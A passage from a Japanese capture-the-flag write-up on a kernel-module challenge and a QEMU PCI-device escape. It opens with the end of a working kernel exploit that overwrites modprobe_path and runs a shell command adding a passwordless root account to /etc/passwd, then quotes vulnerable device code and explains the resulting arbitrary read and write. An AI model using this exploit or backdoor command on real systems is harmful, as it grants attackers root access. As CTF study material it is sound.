                ret = pwrite(fd, buf, len, 0);
                pwrite(fd, &old, sizeof(uint64_t), 1<<shift);
                return ret;
        }

        memset(buffer, 0, 0x800);
        aar(buffer, ADDR_IDT+0x14, 0x100);

        uint64_t kbase = buffer[0] - 0x608e03;
        uint64_t modprobe_path = kbase + 0xa38da0;
        printf("[+] kbase: 0x%lx\n", kbase);
        printf("[+] modprobe_path: 0x%lx\n", modprobe_path);
        buffer[0] = 0x612f706d742f;//tmp/a
        aaw(buffer, modprobe_path, 7);
        puts("done.");
        //exploit_pause();
        system("cd /tmp;echo -ne '#!/bin/sh\necho hack::0:0::/root:/bin/sh >> /etc/passwd\n' > /tmp/a; echo -ne '\\xff\\xff\\xff\\xff' > /tmp/b; chmod +x /tmp/b; chmod +x /tmp/a; /tmp/b; exec su - hack");

}
```

muslでコンパイルしていると上手くmmapが使われてなさそうでバグを触れず、気づくのにかなり時間がかかりました。

# qmemo

バグはシンプルで、`reg_mmio`の後ろ4バイトが多く読み書きできます。

```c
static uint64_t pci_memodev_mmio_read(void *opaque, hwaddr addr, unsigned size) {
        PCIMemoDevState *ms = opaque;
        const char *buf = (void*)&ms->reg_mmio;

        if(addr > sizeof(ms->reg_mmio))
                return 0;

        tprintf("addr:%lx, size:%d, %p\n", addr, size, &buf[addr]);

        return *(uint64_t*)&buf[addr];
}

static void pci_memodev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size) {
        PCIMemoDevState *ms = opaque;
        char *buf = (void*)&ms->reg_mmio;

        if(addr > sizeof(ms->reg_mmio)) return;

        tprintf("addr:%lx, size:%d, val:%lx\n", addr, size, val);

        *(uint64_t*)&buf[addr] = (val & ((1UL << size*8) - 1)) | (*(uint64_t*)&buf[addr] & ~((1UL << size*8) - 1));
}
```

`reg_mmio`の後ろは`addr_ram`と呼ばれるポインタが置いてあって、これの下4バイトが書き換えられます。

```c
struct PCIMemoDevState {
        PCIDevice parent_obj;                                                                            

        const bool prefetch_ram;
        const uint32_t limit_pages;                                                                      

        MemoryRegion portio;                                                                             
        MemoryRegion mmio;                                                                               
        MemoryRegion ram;                                                                                

        struct PCIMemoDevHdr reg_mmio;                                                                   
        void *addr_ram;
        uint8_t cmd_result;                                                                              
        uint8_t int_flag;                                                                                

        int data_fd;
        uint32_t *list_base, *list_cur;                                                                  
        uint32_t key, count;                                                                             
}; 
```

この`addr_ram`はSTORE_PAGE、LOAD_PAGEでそれぞれwrite、read用のバッファポインタとして使われます。`addr_ram`をセットしたあとでLOAD_PAGEとすればAAR、STORE_PAGEでAAWになりそうです。

またSTORE_PAGEの方は、同じくコントロールできる`sdma_addr`が有効な物理アドレスでなかった場合もエラーにならず、もとの`addr_ram`の中身を書いてくれます。未初期化なので何かしらのポインタが残っているとうれしいです。

```c
                case CMD_STORE_PAGE:
                        tprintf("STORE_PAGE (pgoff:%d)\n", le32_to_cpu(ms->reg_mmio.pgoff));

                        if(!ms->count || !ms->list_cur || ms->data_fd < 0)
                                break;

                        if(le64_to_cpu(ms->reg_mmio.sdma_addr) != DMA_MAPPING_ERROR){
                                tprintf("dma_read (%lx -> %p)\n", le64_to_cpu(ms->reg_mmio.sdma_addr), ms->addr_ram);
                                pci_dma_read(pci_dev, le64_to_cpu(ms->reg_mmio.sdma_addr), ms->addr_ram, PAGE_SIZE);
                                ms->int_flag |= INT_SDMA;
                        }

                        if(write(ms->data_fd, ms->addr_ram, PAGE_SIZE) < 0) // <--
                                break;
                        *ms->list_cur++ = le32_to_cpu(ms->reg_mmio.pgoff);
                        ms->count--;
                        ms->int_flag |= INT_WRITE_FILE;
                        result = RESULT_COMPLETE;
                        break;
```

```c
                case CMD_LOAD_PAGE:
                        tprintf("LOAD_PAGE\n");

                        if(!ms->list_cur || ms->data_fd < 0)
                                break;

                        if(read(ms->data_fd, ms->addr_ram, PAGE_SIZE) < 0) // <--
                                break;
                        ms->reg_mmio.pgoff = cpu_to_le32(*ms->list_cur++);
                        ms->int_flag |= INT_READ_FILE;

                        if(le64_to_cpu(ms->reg_mmio.sdma_addr) != DMA_MAPPING_ERROR){
                                tprintf("dma_write (%lx <- %p)\n", le64_to_cpu(ms->reg_mmio.sdma_addr), ms->addr_ram);
                                pci_dma_write(pci_dev, le64_to_cpu(ms->reg_mmio.sdma_addr), ms->addr_ram, PAGE_SIZE);
                                ms->int_flag |= INT_SDMA;
                        }

                        result = RESULT_COMPLETE;
                        break;
```

あとはやり取りをするための鍵の設定や、共有メモリの設定などをして、リークを繰り返して書き込み先を求めます。（コードはほぼ回答通りになったので省略します。）

# その他
- umemoはqemu内のユーザプロセスなので、デバッグするためにramfsにgdbserverを入れる必要があります。
- カーネルモジュールの動きを見る必要もあるので、qemuの外からもアタッチして眺めるようにします。すこしややこしいです。
- kmemo、qmemoのエクスプロイトの送り込みですが、今回はネットワークが有効だったので、10.0.2.2でホストからダウンロードして進めました。本番環境へはbase64でちまちま送っています。

一通りどうなっているのか理解するのにとても時間がかかりましたが、楽しかったです。